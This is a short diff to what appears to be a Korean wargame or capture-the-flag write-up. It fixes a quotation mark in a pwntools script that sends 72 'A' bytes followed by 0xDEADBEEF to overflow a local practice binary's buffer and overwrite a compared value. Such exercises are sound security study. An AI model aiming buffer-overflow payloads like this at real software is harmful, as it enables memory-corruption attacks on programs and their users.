@@ -22,7 +22,7 @@ cmp에 보면 0xDEADBEEF와 비교하고 있는 것을 알 수 있다.
 
 from pwn import *
 
-p=process(./prob2")
+p=process("./prob2")
 
 d = b'A'*72
 d += p64(0x0DEADBEEF) #데드비프??
